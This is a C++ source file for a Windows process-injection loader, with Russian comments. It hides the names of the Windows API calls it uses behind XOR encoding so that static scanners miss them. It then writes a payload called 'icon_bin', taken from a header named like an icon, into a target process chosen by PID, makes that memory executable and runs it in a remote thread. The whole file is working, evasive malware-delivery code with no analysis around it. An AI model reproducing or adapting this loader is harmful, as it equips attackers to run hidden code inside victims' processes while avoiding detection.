#include <windows.h>
#include <iostream>
#include "icon.h"

char* decrypt(unsigned char enc[], int len)
{
    char* result = new char[len + 1];  // выделяем место под строку
    for (int i = 0; i < len; i++)
    {
        result[i] = enc[i] ^ 0x55;    // расшифровываем каждый байт
    }
    result[len] = '\0';               // конец строки
    return result;
}

int main(int argc, char *argv[])
{
	DWORD pid = atoi(argv[1]);

	// определяем тип функции:
	typedef HANDLE(WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
	typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
	typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
	typedef BOOL(WINAPI* pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
	typedef HANDLE(WINAPI* pCreateRemoteThread)(HANDLE, PSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
	
	
	// получаем адрес во время выполнения:
	unsigned char encOpenProcess[] = {0x1a, 0x25, 0x30, 0x3b, 0x05, 0x27, 0x3a, 0x36, 0x30, 0x26, 0x26};
	pOpenProcess myOpenProcess = (pOpenProcess)GetProcAddress(
		GetModuleHandleA("kernel32.dll"),
		decrypt(encOpenProcess, sizeof(encOpenProcess))
	);

	unsigned char encVirtualAllocEx[] = {0x03, 0x3c, 0x27, 0x21, 0x20, 0x34, 0x39, 0x14, 0x39, 0x39, 0x3a, 0x36, 0x10, 0x2d};
	pVirtualAllocEx myVirtualAllocEx = (pVirtualAllocEx)GetProcAddress(
		GetModuleHandleA("kernel32.dll"),
		decrypt(encVirtualAllocEx, sizeof(encVirtualAllocEx))
	);

	unsigned char encWriteProcessMemory[] = {0x02, 0x27, 0x3c, 0x21, 0x30, 0x05, 0x27, 0x3a, 0x36, 0x30, 0x26, 0x26, 0x18, 0x30, 0x38, 0x3a, 0x27, 0x2c};
	pWriteProcessMemory myWriteProcessMemory = (pWriteProcessMemory)GetProcAddress(
		GetModuleHandleA("kernel32.dll"),
		decrypt(encWriteProcessMemory, sizeof(encWriteProcessMemory))
	);

	unsigned char encVirtualProtectEx[] = {0x03, 0x3c, 0x27, 0x21, 0x20, 0x34, 0x39, 0x05, 0x27, 0x3a, 0x21, 0x30, 0x36, 0x21, 0x10, 0x2d};
	pVirtualProtectEx myVirtualProtectEx = (pVirtualProtectEx)GetProcAddress(
		GetModuleHandleA("kernel32.dll"),
		decrypt(encVirtualProtectEx, sizeof(encVirtualProtectEx))
	);

	unsigned char encCreateRemoteThread[] = {0x16, 0x27, 0x30, 0x34, 0x21, 0x30, 0x07, 0x30, 0x38, 0x3a, 0x21, 0x30, 0x01, 0x3d, 0x27, 0x30, 0x34, 0x31};
	pCreateRemoteThread myCreateRemoteThread = (pCreateRemoteThread)GetProcAddress(
		GetModuleHandleA("kernel32.dll"),
		decrypt(encCreateRemoteThread, sizeof(encCreateRemoteThread))
	);

	//вызываем функицию через указатель:
	HANDLE hProcess = myOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!hProcess){return 1;}

	LPVOID remoteBuffer = myVirtualAllocEx(hProcess, NULL, icon_bin_len,  MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!remoteBuffer){return 1;}

	BOOL write = myWriteProcessMemory(hProcess, remoteBuffer, icon_bin, icon_bin_len, NULL);
	if (!write){return 1;}

	DWORD oldProtect;

	BOOL perm = myVirtualProtectEx(hProcess, remoteBuffer, icon_bin_len, PAGE_EXECUTE_READ, &oldProtect);
	if (!perm){return 1;}

	HANDLE thread = myCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	if (!thread){return 1;}

	return 0;
}
